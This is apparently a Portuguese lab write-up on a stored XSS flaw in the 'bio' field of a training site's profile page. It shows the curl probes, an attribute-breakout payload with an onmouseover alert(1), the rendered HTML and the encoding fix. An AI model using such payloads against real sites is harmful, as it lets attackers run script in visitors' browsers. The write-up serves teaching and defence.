# Stored XSS — Como encontrei e executei o ataque

---

## 1. Como descobri a falha

O primeiro passo foi buscar o HTML da página de edição de perfil:

```bash
curl -H "Cookie: session=SEU_COOKIE" http://web0x01.hbtn/a3/xss_stored/edit
```

O servidor retornou os dados do perfil como atributos de um `<div>`:

```html
<div id="main" f_name="Yosri" l_name="G" role="Expert" tz="1" bio="Hello...">
```

O exercício dava a dica **"Quotes.."** — isso me indicou que o problema estava
nas aspas dos atributos. Então testei injetar uma aspas dupla `"` em cada campo:

```bash
curl -X POST -H "Cookie: ..." -H "Content-Type: application/json" \
  http://web0x01.hbtn/api/a3/xss_stored/update \
  -d '{"bio":"TESTE\"ASPAS"}'
```

Depois busquei o HTML gerado e comparei campo por campo:

```
f_name = "TESTE&#34;ASPAS"   → aspas virou &#34; (escapada)  ✅ seguro
l_name = "TESTE&#34;ASPAS"   → escapada                       ✅ seguro
role   = "TESTE&#34;ASPAS"   → escapada                       ✅ seguro
tz     = "TESTE&#34;ASPAS"   → escapada                       ✅ seguro
bio    = "TESTE"ASPAS"       → aspas CRUA, sem escape          ❌ vulnerável
```

**Achei a falha: o campo `bio` não escapa o caractere `"` antes de colocar
o valor no HTML.**

---

## 2. Como executei o ataque

Com a falha confirmada, montei um payload que quebra o atributo e injeta
um event handler novo:

```bash
curl -X POST \
  -H "Cookie: session=SEU_COOKIE" \
  -H "Content-Type: application/json" \
  http://web0x01.hbtn/api/a3/xss_stored/update \
  -d '{"bio":"\" onmouseover=\"alert(1)"}'
```

O servidor salvou o payload no banco e ao renderizar o perfil gerou:

```html
<!-- antes do ataque -->
<div id="main" bio="texto normal">

<!-- depois do ataque -->
<div id="main" bio="" onmouseover="alert(1)">
```

A `"` no início do payload **fechou o atributo bio**. Tudo que veio depois
foi interpretado pelo browser como um novo atributo HTML do elemento.
Ao mover o mouse sobre a página, `alert(1)` executou.

---

## 3. O ponto mais importante

> **O servidor confiava no dado que ele mesmo havia salvo.**

Todos os outros campos escapavam a aspas ao renderizar. O `bio` não escapava.
Esse detalhe — um único caractere `"` sem tratamento — foi suficiente para
um atacante escrever código que executa no browser de qualquer visitante.

A causa raiz é simples: o valor foi colocado dentro de um atributo HTML
**sem passar por HTML encoding**. A correção seria converter `"` em `&#34;`
antes de montar o HTML. Uma linha de código protege todos os usuários.
